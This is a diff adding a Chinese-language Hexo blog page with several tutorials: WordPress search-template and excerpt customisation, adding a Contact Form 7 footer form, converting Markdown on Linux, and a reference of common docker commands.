+                                              &quot;&quot;.__(&#39;Comments Disabled&#39;,&#39;avia_framework&#39;));
+                        echo &quot;&lt;/span&gt;&quot;;
+                    &#125;
+                &#125;
+
+
+                $taxonomies  = get_object_taxonomies(get_post_type($the_id));
+                $cats = &#39;&#39;;
+                $excluded_taxonomies = array_merge( get_taxonomies( array( &#39;public&#39; =&gt; false ) ), array(&#39;post_tag&#39;,&#39;post_format&#39;) );
+                $excluded_taxonomies = apply_filters(&#39;avf_exclude_taxonomies&#39;, $excluded_taxonomies, get_post_type($the_id), $the_id);
+
+                if(!empty($taxonomies))
+                &#123;
+                    foreach($taxonomies as $taxonomy)
+                    &#123;
+                        if(!in_array($taxonomy, $excluded_taxonomies))
+                        &#123;
+                            $cats .= get_the_term_list($the_id, $taxonomy, &#39;&#39;, &#39;, &#39;,&#39;&#39;).&#39; &#39;;
+                        &#125;
+                    &#125;
+                &#125;
+
+                if(!empty($cats))
+                &#123;
+                    echo &quot;&lt;span class=&#39;text-sep&#39;&gt;/&lt;/span&gt;&quot;;
+                    echo &#39;&lt;span class=&quot;blog-categories minor-meta&quot;&gt;&#39;.__(&#39;in&#39;,&#39;avia_framework&#39;).&quot; &quot;;
+                    echo $cats;
+                    echo &#39;&lt;/span&gt;&#39;;
+                &#125;
+
+                ?&gt;
+
+            &lt;/span&gt;
+        &lt;/header&gt;
+
+        &lt;?php
+            echo &#39;&lt;div class=&quot;entry-content&quot; &#39;.avia_markup_helper(array(&#39;context&#39; =&gt; &#39;entry_content&#39;,&#39;echo&#39;=&gt;false)).&#39;&gt;&#39;;
+            $excerpt = trim(get_the_excerpt());
+            if(!empty($excerpt))
+            &#123;
+                the_excerpt();
+            &#125;
+            else
+            &#123;
+                $excerpt = strip_shortcodes( get_the_content() );
+                $excerpt = apply_filters(&#39;the_excerpt&#39;, $excerpt);
+                $excerpt = str_replace(&#39;]]&gt;&#39;, &#39;]]&amp;gt;&#39;, $excerpt);
+                echo $excerpt;
+            &#125;
+            echo &#39;&lt;/div&gt;&#39;;
+        ?&gt;
+    &lt;/div&gt;
+
+    &lt;footer class=&quot;entry-footer&quot;&gt;&lt;/footer&gt;
+
+    &lt;?php do_action(&#39;ava_after_content&#39;, $the_id, &#39;loop-search&#39;); ?&gt;
+&lt;/article&gt;&lt;!--end post-entry--&gt;</code></pre>
+<p>前台优化代码：</p>
+<pre><code>#top .template-search.content .nocti_customsearch &#123;
+    padding-left: 100px;
+&#125;
+
+.nocti_customsearch .search-result-counter &#123;
+    height: auto;
+    padding: 0px !important;
+    border-radius: 0px;
+    width: 80px !important;
+    background: transparent !important;
+    border-color: transparent !important;
+    border: 0px solid transparent;
+    box-shadow: none !important;
+&#125;
+
+.nocti_customsearch .entry-content p&#123;
+    padding: 0px !important;
+    margin: 0px !important;
+&#125;</code></pre>
+<p>这个时候我们可能会发现摘要这里显示得有点长，显得不美观，那么怎么办呢？我们可以参考wordpress的官网，限制摘要显示的长度，参考：<a target="_blank" rel="noopener" href="https://developer.wordpress.org/reference/functions/the_excerpt/">https://developer.wordpress.org/reference/functions/the_excerpt/</a></p>
+<p><strong>使用过滤器控制摘录长度</strong></p>
+<p>默认情况下，摘录长度设置为50个字。要使用excerpt_length过滤器，将摘录长度更改为50个字，请将以下代码添加到functions.php文件中。</p>
+<pre><code>/**
+ * Filter the except length to 50 words.
+ *
+ * @param int $length Excerpt length.
+ * @return int (Maybe) modified excerpt length.
+ */
+function wpdocs_custom_excerpt_length( $length ) &#123;
+    return 50;
+&#125;
+add_filter( &#39;excerpt_length&#39;, &#39;wpdocs_custom_excerpt_length&#39;, 999 );</code></pre>
+<p>这个时候我们如果想要修改显示的字符串，怎么办呢？我们继续往下看：</p>
+<p><strong>[…]使用过滤器修改字符串</strong></p>
+<p>默认情况下，最后的摘录“read more”字符串设置为“[…]”。要使用excerpt_more过滤器更改摘录“阅读更多”字符串，请将以下代码添加到functions.php主题中的文件中：</p>
+<pre><code>/**
+ * Filter the excerpt &quot;read more&quot; string.
+ *
+ * @param string $more &quot;Read more&quot; excerpt string.
+ * @return string (Maybe) modified &quot;read more&quot; excerpt string.
+ */
+function wpdocs_excerpt_more( $more ) &#123;
+    return &#39;[.....]&#39;;
+&#125;
+add_filter( &#39;excerpt_more&#39;, &#39;wpdocs_excerpt_more&#39; );</code></pre>
+<p>美化后的效果如下：</p>
+<p><img src="https://i.imgur.com/XcQogdU.jpg"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2017/10/31/%E7%BD%91%E7%AB%99%E5%BA%95%E9%83%A8%E6%B7%BB%E5%8A%A0%E8%81%94%E7%B3%BB%E8%A1%A8%E5%8D%95%E6%95%99%E7%A8%8B/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2017/10/31/%E7%BD%91%E7%AB%99%E5%BA%95%E9%83%A8%E6%B7%BB%E5%8A%A0%E8%81%94%E7%B3%BB%E8%A1%A8%E5%8D%95%E6%95%99%E7%A8%8B/" class="post-title-link" itemprop="url">wordpress网站底部添加联系表单教程</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2017-10-31 17:06:02" itemprop="dateCreated datePublished" datetime="2017-10-31T17:06:02+08:00">2017-10-31</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-10-11 11:52:54" itemprop="dateModified" datetime="2020-10-11T11:52:54+08:00">2020-10-11</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p><strong>解决方案如下：</strong></p>
+<p>1、首先安装<a target="_blank" rel="noopener" href="https://wordpress.org/plugins/contact-form-7/">contact form7</a>插件</p>
+<p><img src="https://i.imgur.com/fZazZC1.jpg"></p>
+<p>2、新建一个表单，如果没有的话。接着进入到表单详情页面，默认截图如下：</p>
+<p><img src="https://i.imgur.com/GJXL0vM.jpg"></p>
+<p>删除不必要的字段，添加自己需要的字段，以下我们将以只添加一个电邮表单为例，先删除默认的，只留下提交按钮即可，点击email，截图如下：</p>
+<p><img src="https://i.imgur.com/evqbbY6.jpg"></p>
+<p><img src="https://i.imgur.com/cRj1efF.jpg"></p>
+<p>保持默认即可。</p>
+<p>好的，我们添加了一个电邮字段，以下是我添加截图：</p>
+<p><img src="https://i.imgur.com/rsEHCei.jpg"></p>
+<p>红色框中是添加的字段，外面的<div>是自定义添加的，主要是为了调试表单的样式，如果使用默认的样式，这个可以不用添加。</p>
+<p>接下来，我们要设置一下接收电邮的邮箱地址，我们选择选项栏中的Mail，点击进入，设置截图如下：</p>
+<p><img src="https://i.imgur.com/5KBNtsm.jpg"></p>
+<p>设置完毕后，我们为这个表单命名，我这里命名为newss，接着我们保存这个表单，回到表单列表中。</p>
+<p><img src="https://i.imgur.com/uUbjKJh.jpg"></p>
+<p>我们来到小工具栏，找到网站底部添加的地方：</p>
+<p><img src="https://i.imgur.com/jj3NyDC.jpg"></p>
+<p>保存，刷新网站的前台，我们将会在网站的底部看到显示的表单。样式可能会有差异，大家根据需要自行调试样式即可。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2017/10/27/%E5%A6%82%E4%BD%95%E5%9C%A8Linux%E4%B8%8B%E4%BD%BF%E7%94%A8Markdown%E8%BF%9B%E8%A1%8C%E6%96%87%E6%A1%A3%E5%B7%A5%E4%BD%9C/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2017/10/27/%E5%A6%82%E4%BD%95%E5%9C%A8Linux%E4%B8%8B%E4%BD%BF%E7%94%A8Markdown%E8%BF%9B%E8%A1%8C%E6%96%87%E6%A1%A3%E5%B7%A5%E4%BD%9C/" class="post-title-link" itemprop="url">如何在Linux下使用Markdown进行文档工作</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2017-10-27 17:23:22" itemprop="dateCreated datePublished" datetime="2017-10-27T17:23:22+08:00">2017-10-27</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-10-11 11:52:57" itemprop="dateModified" datetime="2020-10-11T11:52:57+08:00">2020-10-11</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>自从使用了markdown，做文档工作就很顺手。我几乎将工作中所有的文档工作都用markdown来完成。最近有了一些新的体验，也发现了一些新的问题。</p>
+<p>在Linux系统中，编辑markdown可以用retext工具，可以在shell里面打开markdown文件，前提电脑安装了markdown：</p>
+<pre><code># Debian/Ubuntu
+sudo apt-get install retext
+retext Release-Notes.md</code></pre>
+<p>要将markdown文件转换成html文件，可以用discount或python-markdown软件包提供的markdown：</p>
+<pre><code># Debian/Ubuntu
+sudo apt-get install discount</code></pre>
+<p>或：</p>
+<pre><code># Debian/Ubuntu
+sudo apt-get install python-markdown</code></pre>
+<p>转换工作很简单：</p>
+<pre><code># 用discount提供的markdown工具
+markdown -o Release-Notes.html Release-Notes.md
+# 用python-markdown提供的markdown_py工具
+markdown_py -o html4 Release-Notest.md &gt; Release-Notes.html</code></pre>
+<p>如果要生成PDF，也很简单，可以用python-pisa提供的xhtml2pdf：</p>
+<pre><code># Debian/Ubuntu
+sudo apt-get install python-pisa
+
+# 将html转换成PDF
+xhtml2pdf --html Release-Notes.html Release-Notes.pdf</code></pre>
+<p>所以，你可以在文档目录下放置这样一个Makefile来自动这个过程：</p>
+<pre><code># Makefile
+
+MD = markdown
+MDFLAGS = -T
+H2P = xhtml2pdf
+H2PFLAGS = --html
+SOURCES := $(wildcard *.md)
+OBJECTS := $(patsubst %.md, %.html, $(wildcard *.md))
+OBJECTS_PDF := $(patsubst %.md, %.pdf, $(wildcard *.md))
+
+all: build
+
+build: html pdf
+
+pdf: $(OBJECTS_PDF)
+
+html: $(OBJECTS)
+
+$(OBJECTS_PDF): %.pdf: %.html
+    $(H2P) $(H2PFLAGS) $&lt; &gt; $@ 
+
+$(OBJECTS): %.html: %.md
+    $(MD) $(MDFLAGS) -o $@ $&lt;
+clean:
+    rm -f $(OBJECTS)</code></pre>
+<p>这样你就可以通过简单的一个命令生成当前目录下所有md文件的pdf或html输出了：</p>
+<pre><code># html 输出
+make html
+
+# pdf输出
+make pdf</code></pre>
+<p>这里有个问题是如果markdown的内容是中文，那么转换出来的html在浏览器中打开就无法自动识别编码，pdf更惨，直接是一堆乱码。这时我们可以借助markdown对html标记的支持来在markdown文件中加入编码信息。例如我们要将markdown转换为html4文件，可以在文件的开头加上meta标记，指明编码格式：</p>
+<pre><code>sed -i &#39;1i\&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;&#39; *.md</code></pre>
+<p>这样就可以了。另外，最近使用图灵社区的编辑系统时，markdown会时不时将下划线（_）当作斜体的标记，结果函数名就成了这样的：</p>
+<pre><code># 实际上是ssl_use_cabundle
+sslusecabundle</code></pre>
+<p>我建议斜体字标记采用单个星号（<em>），加粗字体采用两个星号（<strong>），这样使用起来就方便多了。当然，这个问题本身在于markdown说用星号或下划线都可以。但实际上，两个都支持反倒会造成一些问题。比如有的地方用下划线（<strong>粗体</strong> -&gt; 粗体），有的地方用星号（</strong>粗体** -&gt; 粗体），看起来反倒混乱不堪（选星号</em>的另一个理由是下划线在内容中出现的概率比星号高很多）。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2017/10/27/docker%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2017/10/27/docker%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/" class="post-title-link" itemprop="url">docker常用命令详解</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2017-10-27 16:00:57" itemprop="dateCreated datePublished" datetime="2017-10-27T16:00:57+08:00">2017-10-27</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-10-11 11:53:34" itemprop="dateModified" datetime="2020-10-11T11:53:34+08:00">2020-10-11</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>本文只记录docker命令在大部分情境下的使用，如果想了解每一个选项的细节，请参考官方文档，这里只作为自己以后的备忘记录下来。</p>
+<p>根据自己的理解，总的来说分为以下几种：</p>
+<pre><code>容器生命周期管理 — docker [run|start|stop|restart|kill|rm|pause|unpause]
+容器操作运维 — docker [ps|inspect|top|attach|events|logs|wait|export|port]
+容器rootfs命令 — docker [commit|cp|diff]
+镜像仓库 — docker [login|pull|push|search]
+本地镜像管理 — docker [images|rmi|tag|build|history|save|import]
+其他命令 — docker [info|version]</code></pre>
+<p><strong>1. 列出机器上的镜像（images）</strong></p>
+<pre><code># docker images 
+REPOSITORY               TAG             IMAGE ID        CREATED         VIRTUAL SIZE
+ubuntu                   14.10           2185fd50e2ca    13 days ago     236.9 MB
+…</code></pre>
+<p>其中我们可以根据REPOSITORY来判断这个镜像是来自哪个服务器，如果没有 / 则表示官方镜像，类似于username/repos_name表示Github的个人公共库，类似于regsistory.example.com:5000/repos_name则表示的是私服。</p>
+<p>IMAGE ID列其实是缩写，要显示完整则带上–no-trunc选项</p>
+<p><strong>2. 在docker index中搜索image（search）</strong></p>
+<pre><code>Usage: docker search TERM
+
+# docker search seanlo
+NAME                DESCRIPTION           STARS     OFFICIAL   AUTOMATED
+seanloook/centos6   sean&#39;s docker repos         0</code></pre>
+<p>搜索的范围是官方镜像和所有个人公共镜像。NAME列的 / 后面是仓库的名字。</p>
+<p><strong>3. 从docker registry server 中下拉image或repository（pull）</strong></p>
+<pre><code>Usage: docker pull [OPTIONS] NAME[:TAG]
+
+# docker pull centos</code></pre>
+<p>上面的命令需要注意，在docker v1.2版本以前，会下载官方镜像的centos仓库里的所有镜像，而从v.13开始官方文档里的说明变了：will pull the centos:latest image, its intermediate layers and any aliases of the same id，也就是只会下载tag为latest的镜像（以及同一images id的其他tag）。</p>
+<p>也可以明确指定具体的镜像：</p>
+<pre><code># docker pull centos:centos6</code></pre>
+<p>当然也可以从某个人的公共仓库（包括自己是私人仓库）拉取，形如docker pull username/repository&lt;:tag_name&gt; ：</p>
+<pre><code># docker pull seanlook/centos:centos6</code></pre>
+<p>如果你没有网络，或者从其他私服获取镜像，形如docker pull registry.domain.com:5000/repos:<tag_name></p>
+<pre><code># docker pull dl.dockerpool.com:5000/mongo:latest</code></pre>
+<p><strong>4. 推送一个image或repository到registry（push）</strong><br>与上面的pull对应，可以推送到Docker Hub的Public、Private以及私服，但不能推送到Top Level Repository。</p>
+<pre><code># docker push seanlook/mongo
+# docker push registry.tp-link.net:5000/mongo:2014-10-27</code></pre>
+<p>registry.tp-link.net也可以写成IP，172.29.88.222。<br>在repository不存在的情况下，命令行下push上去的会为我们创建为私有库，然而通过浏览器创建的默认为公共库。</p>
+<p><strong>5. 从image启动一个container（run）</strong></p>
+<p>docker run命令首先会从特定的image创之上create一层可写的container，然后通过start命令来启动它。停止的container可以重新启动并保留原来的修改。run命令启动参数有很多，以下是一些常规使用说明，更多部分请参考<a target="_blank" rel="noopener" href="http://www.cnphp6.com/archives/24899">http://www.cnphp6.com/archives/24899</a><br>当利用 docker run 来创建容器时，Docker 在后台运行的标准操作包括：</p>
+<ul>
+<li>检查本地是否存在指定的镜像，不存在就从公有仓库下载</li>
+</ul>
+<ul>
+<li>利用镜像创建并启动一个容器</li>
+</ul>
+<ul>
+<li>分配一个文件系统，并在只读的镜像层外面挂载一层可读写层</li>
+</ul>
+<ul>
+<li>从宿主主机配置的网桥接口中桥接一个虚拟接口到容器中去</li>
+</ul>
+<ul>
+<li>从地址池配置一个 ip 地址给容器</li>
+</ul>
+<ul>
+<li>执行用户指定的应用程序</li>
+</ul>
+<ul>
+<li>执行完毕后容器被终止</li>
+</ul>
+<pre><code>Usage: docker run [OPTIONS] IMAGE [COMMAND] [ARG...]</code></pre>
+<p><strong>5.1 使用image创建container并执行相应命令，然后停止</strong></p>
+<pre><code># docker run ubuntu echo &quot;hello world&quot;
+hello word</code></pre>
+<p>这是最简单的方式，跟在本地直接执行echo ‘hello world’ 几乎感觉不出任何区别，而实际上它会从本地ubuntu:latest镜像启动到一个容器，并执行打印命令后退出（docker ps -l可查看）。</p>
+<p>需要注意的是，默认有一个–rm=true参数，即完成操作后停止容器并从文件系统移除。因为Docker的容器实在太轻量级了，很多时候用户都是随时删除和新创建容器。</p>
+<p>容器启动后会自动随机生成一个CONTAINER ID，这个ID在后面commit命令后可以变为IMAGE ID</p>
+<p>使用image创建container并进入交互模式, login shell是/bin/bash</p>
+<pre><code># docker run -i -t --name mytest centos:centos6 /bin/bash
+bash-4.1#</code></pre>
+<p>上面的–name参数可以指定启动后的容器名字，如果不指定则docker会帮我们取一个名字。镜像centos:centos6也可以用IMAGE ID (68edf809afe7) 代替），并且会启动一个伪终端，但通过ps或top命令我们却只能看到一两个进程，因为容器的核心是所执行的应用程序，所需要的资源都是应用程序运行所必需的，除此之外，并没有其它的资源，可见Docker对资源的利用率极高。</p>
+<p>此时使用exit或Ctrl+D退出后，这个容器也就消失了（消失后的容器并没有完全删除？）</p>
+<p>（那么多个TAG不同而IMAGE ID相同的的镜像究竟会运行以哪一个TAG启动呢</p>
+<p><strong>5.2 运行出一个container放到后台运行</strong></p>
+<pre><code># docker run -d ubuntu /bin/sh -c &quot;while true; do echo hello world; sleep 2; done&quot;
+ae60c4b642058fefcc61ada85a610914bed9f5df0e2aa147100eab85cea785dc</code></pre>
+<p>它将直接把启动的container挂起放在后台运行（这才叫saas），并且会输出一个CONTAINER ID，通过docker ps可以看到这个容器的信息，可在container外面查看它的输出docker logs ae60c4b64205，也可以通过docker attach ae60c4b64205连接到这个正在运行的终端，此时在Ctrl+C退出container就消失了，按ctrl-p ctrl-q可以退出到宿主机，而保持container仍然在运行。</p>
+<p>另外，如果-d启动但后面的命令执行完就结束了，如/bin/bash、echo test，则container做完该做的时候依然会终止。而且-d不能与–rm同时使用。可以通过这种方式来运行memcached、apache等。</p>
+<p><strong>5.3 映射host到container的端口和目录</strong></p>
+<p>映射主机到容器的端口是很有用的，比如在container中运行memcached，端口为11211，运行容器的host可以连接container的 internel_ip:11211 访问，如果有从其他主机访问memcached需求那就可以通过-p选项，形如-p<br>&lt;host_port:contain_port&gt;，存在以下几种写法：</p>
+<pre><code>-p 11211:11211 这个即是默认情况下，绑定主机所有网卡（0.0.0.0）的11211端口到容器的11211端口上
+-p 127.0.0.1:11211:11211 只绑定localhost这个接口的11211端口
+-p 127.0.0.1::5000
+-p 127.0.0.1:80:8080</code></pre>
+<p>目录映射其实是“绑定挂载”host的路径到container的目录，这对于内外传送文件比较方便，在搭建私服那一节，为了避免私服container停止以后保存的images不被删除，就要把提交的images保存到挂载的主机目录下。使用比较简单，-v<br>&lt;host_path:container_path&gt;，绑定多个目录时再加-v。</p>
+<pre><code>-v /tmp/docker:/tmp/docker</code></pre>
+<p>另外在两个container之间建立联系可用–link，详见高级部分或官方文档。<br>下面是一个例子：</p>
+<pre><code># docker run --name nginx_test \
+&gt; -v /tmp/docker:/usr/share/nginx/html:ro \
+&gt; -p 80:80 -d \
+&gt; nginx:1.7.6
+&gt; </code></pre>
+<p>在主机的/tmp/docker下建立index.html，就可以通过<a target="_blank" rel="noopener" href="http://localhost/%E6%88%96http://host-ip:80%E8%AE%BF%E9%97%AE%E4%BA%86%E3%80%82">http://localhost:80/或http://host-ip:80访问了。</a></p>
+<p><strong>6. 将一个container固化为一个新的image（commit）</strong></p>
+<p>当我们在制作自己的镜像的时候，会在container中安装一些工具、修改配置，如果不做commit保存起来，那么container停止以后再启动，这些更改就消失了。</p>
+<pre><code>docker commit &lt;container&gt; [repo:tag]</code></pre>
+<p>后面的repo:tag可选</p>
+<p>只能提交正在运行的container，即通过docker ps可以看见的容器，</p>
+<p>查看刚运行过的容器</p>
+<pre><code># docker ps -l
+CONTAINER ID   IMAGE     COMMAND      CREATED       STATUS        PORTS   NAMES
+c9fdf26326c9   nginx:1   nginx -g..   3 hours ago   Exited (0)..     nginx_test</code></pre>
+<p>启动一个已存在的容器（run是从image新建容器后再启动），以下也可以使用docker start nginx_test代替 </p>
+<pre><code>[root@hostname docker]# docker start c9fdf26326c9
+c9fdf26326c9
+
+docker run -i -t --sig-proxy=false 21ffe545748baf /bin/bash</code></pre>
+<p>nginx服务没有启动</p>
+<pre><code># docker commit -m &quot;some tools installed&quot; fcbd0a5348ca seanlook/ubuntu:14.10_tutorial
+fe022762070b09866eaab47bc943ccb796e53f3f416abf3f2327481b446a9503
+-a “seanlook7@gmail.com”</code></pre>
+<p>请注意，当你反复去commit一个容器的时候，每次都会得到一个新的IMAGE ID，假如后面的repository:tag没有变，通过docker<br>images可以看到，之前提交的那份镜像的repository:tag就会变成<none>:<none>，所以尽量避免反复提交。<br>另外，观察以下几点:</p>
+<p>commit container只会pause住容器，这是为了保证容器文件系统的一致性，但不会stop。如果你要对这个容器继续做其他修改：<br>你可以重新提交得到新image2，删除次新的image1</p>
+<p>也可以关闭容器用新image1启动，继续修改，提交image2后删除image1</p>
+<p>当然这样会很痛苦，所以一般是采用Dockerfile来build得到最终image，参考[]</p>
+<p>虽然产生了一个新的image，并且你可以看到大小有100MB，但从commit过程很快就可以知道实际上它并没有独立占用100MB的硬盘空间，而只是在旧镜像的基础上修改，它们共享大部分公共的“片”。</p>
+<p><strong>1. 开启/停止/重启container（start/stop/restart）</strong></p>
+<p>容器可以通过run新建一个来运行，也可以重新start已经停止的container，但start不能够再指定容器启动时运行的指令，因为docker只能有一个前台进程。<br>容器stop（或Ctrl+D）时，会在保存当前容器的状态之后退出，下次start时保有上次关闭时更改。而且每次进入attach进去的界面是一样的，与第一次run启动或commit提交的时刻相同。</p>
+<pre><code>CONTAINER_ID=$(docker start &lt;containner_id&gt;)
+docker stop $CONTAINER_ID
+docker restart $CONTAINER_ID</code></pre>
+<p>关于这几个命令可以通过一个完整的实例使用：docker如何创建一个运行后台进程的容器并同时提供shell终端。</p>
+<p><strong>2. 连接到正在运行中的container（attach）</strong></p>
+<p>要attach上去的容器必须正在运行，可以同时连接上同一个container来共享屏幕（与screen命令的attach类似）。<br>官方文档中说attach后可以通过CTRL-C来detach，但实际上经过我的测试，如果container当前在运行bash，CTRL-C自然是当前行的输入，没有退出；如果container当前正在前台运行进程，如输出nginx的access.log日志，CTRL-C不仅会导致退出容器，而且还stop了。这不是我们想要的，detach的意思按理应该是脱离容器终端，但容器依然运行。好在attach是可以带上–sig-proxy=false来确保CTRL-D或CTRL-C不会关闭容器。</p>
+<pre><code># docker attach --sig-proxy=false $CONTAINER_ID</code></pre>
+<p><strong>3. 查看image或container的底层信息（inspect）</strong></p>
+<p>inspect的对象可以是image、运行中的container和停止的container。</p>
+<p>查看容器的内部IP</p>
+<pre><code># docker inspect --format=&#39;&#123;&#123;.NetworkSettings.IPAddress&#125;&#125;&#39; $CONTAINER_ID
+172.17.42.35</code></pre>
+<p><strong>4. 删除一个或多个container、image（rm、rmi）</strong></p>
+<p>你可能在使用过程中会build或commit许多镜像，无用的镜像需要删除。但删除这些镜像是有一些条件的：</p>
+<p>同一个IMAGE ID可能会有多个TAG（可能还在不同的仓库），首先你要根据这些image names 来删除标签，当删除最后一个tag的时候就会自动删除镜像；</p>
+<p>承上，如果要删除的多个IMAGE NAME在同一个REPOSITORY，可以通过docker rmi <image_id>来同时删除剩下的TAG；若在不同Repo则还是需要手动逐个删除TAG；</p>
+<p>还存在由这个镜像启动的container时（即便已经停止），也无法删除镜像；</p>
+<p>如何查看镜像与容器的依存关系</p>
+<p>删除容器</p>
+<pre><code>docker rm &lt;container_id/contaner_name&gt;</code></pre>
+<p>删除所有停止的容器</p>
+<pre><code>docker rm $(docker ps -a -q)</code></pre>
+<p>删除镜像</p>
+<pre><code>docker rmi &lt;image_id/image_name ...&gt;</code></pre>
+<p>下面是一个完整的示例：</p>
+<pre><code># docker images            &lt;==
+ubuntu            13.10        195eb90b5349       4 months ago       184.6 MB
+ubuntu            saucy        195eb90b5349       4 months ago       184.6 MB
+seanlook/ubuntu   rm_test      195eb90b5349       4 months ago       184.6 MB
+
+使用195eb90b5349启动、停止一个容器后，删除这个镜像
+
+# docker rmi 195eb90b5349
+Error response from daemon: Conflict, cannot delete image 195eb90b5349 because it is 
+tagged in multiple repositories, use -f to force
+2014/11/04 14:19:00 Error: failed to remove one or more images
+
+删除seanlook仓库中的tag     &lt;==
+
+# docker rmi seanlook/ubuntu:rm_test
+Untagged: seanlook/ubuntu:rm_test
+
+现在删除镜像，还会由于container的存在不能rmi
+
+# docker rmi 195eb90b5349
+
+Error response from daemon: Conflict, cannot delete 195eb90b5349 because the 
+ container eef3648a6e77 is using it, use -f to force
+2014/11/04 14:24:15 Error: failed to remove one or more images
+
+先删除由这个镜像启动的容器    &lt;==
+
+# docker rm eef3648a6e77
+
+删除镜像                    &lt;==
+
+# docker rmi 195eb90b5349
+Deleted: 195eb90b534950d334188c3627f860fbdf898e224d8a0a11ec54ff453175e081
+Deleted: 209ea56fda6dc2fb013e4d1e40cb678b2af91d1b54a71529f7df0bd867adc961
+Deleted: 0f4aac48388f5d65a725ccf8e7caada42f136026c566528a5ee9b02467dac90a
+Deleted: fae16849ebe23b48f2bedcc08aaabd45408c62b531ffd8d3088592043d5e7364
+Deleted: f127542f0b6191e99bb015b672f5cf48fa79d974784ac8090b11aeac184eaaff</code></pre>
+<p>注意，上面的删除过程我所举的例子比较特殊——镜像被tag在多个仓库，也有启动过的容器。按照&lt;==指示的顺序进行即可。</p>
+<p><strong>5. docker build 使用此配置生成新的image</strong></p>
+<p>build命令可以从Dockerfile和上下文来创建镜像：</p>
+<pre><code>docker build [OPTIONS] PATH | URL | -</code></pre>
+<p>上面的PATH或URL中的文件被称作上下文，build image的过程会先把这些文件传送到docker的服务端来进行的。</p>
+<p>如果PATH直接就是一个单独的Dockerfile文件则可以不需要上下文；如果URL是一个Git仓库地址，那么创建image的过程中会自动git clone一份到本机的临时目录，它就成为了本次build的上下文。无论指定的PATH是什么，Dockerfile是至关重要的，请参考Dockerfile<br>Reference。<br>请看下面的例子：</p>
+<pre><code> # cat Dockerfile 
+FROM seanlook/nginx:bash_vim
+EXPOSE 80
+ENTRYPOINT /usr/sbin/nginx -c /etc/nginx/nginx.conf &amp;&amp; /bin/bash
+
+# docker build -t seanlook/nginx:bash_vim_Df .
+Sending build context to Docker daemon 73.45 MB
+Sending build context to Docker daemon 
+Step 0 : FROM seanlook/nginx:bash_vim
+ ---&gt; aa8516fa0bb7
+Step 1 : EXPOSE 80
+ ---&gt; Using cache
+ ---&gt; fece07e2b515
+Step 2 : ENTRYPOINT /usr/sbin/nginx -c /etc/nginx/nginx.conf &amp;&amp; /bin/bash
+ ---&gt; Running in e08963fd5afb
+ ---&gt; d9bbd13f5066
+Removing intermediate container e08963fd5afb
+Successfully built d9bbd13f5066</code></pre>
